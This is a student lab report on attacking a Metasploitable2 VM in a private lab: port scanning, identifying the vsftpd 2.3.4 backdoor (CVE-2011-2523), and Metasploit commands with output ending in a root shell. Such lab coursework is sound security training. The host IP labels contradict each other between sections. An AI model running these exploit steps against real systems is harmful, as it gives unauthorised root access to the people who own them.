# Mini Report — Building Your First Attack Surface Map

**Student Name:** Jumanah Alshehri  
**Date & Time:** 19/10/2025 4:00 PM  
**Kali IP:** 192.168.56.4  
**Target (Metasploitable) IP:** 192.168.56.3

## 1) Live hosts found
- **192.168.56.4** — Metasploitable2 (Host is up)  
- **192.168.56.3** — Kali (lab attacker)  

## 2) Open ports & service versions (top findings)
- **21/tcp** — ftp — *vsftpd 2.3.4*  
- **22/tcp** — ssh — *OpenSSH 4.7p1*  
- **80/tcp** — http — *Apache 2.2.8*  

## 3) Confirmed vulnerability
- **Name:** vsftpd 2.3.4 backdoor  
- **CVE:** CVE-2011-2523  
- **Evidence:** NSE output file `nse_ftp_vsftpd.txt` (attach), screenshot `nse_vsftpd.png`  
- **Notes:** NSE reported **VULNERABLE**

## 4) Attack path / prioritisation

**Why target FTP?**  
Nmap detected an FTP server reporting vsftpd 2.3.4 on port 21. This particular version has a documented backdoor (CVE-2011-2523) that can spawn a bind shell, allowing immediate remote code execution and privilege escalation. Given the exposed service and known exploitability, FTP is a high-priority target for validation and remediation.

Use Metasploit module `exploit/unix/ftp/vsftpd_234_backdoor` to confirm exploitability.

**Output:**
```bash
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.3
RHOSTS => 192.168.56.3
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
RPORT => 21
msf exploit(unix/ftp/vsftpd_234_backdoor) > set VERBOSE true
VERBOSE => true
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.56.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.3:21 - USER: 331 Please specify the password.
[+] 192.168.56.3:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.3:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.4:43965 -> 192.168.56.3:6200) at 2025-10-19 13:14:35 -0400
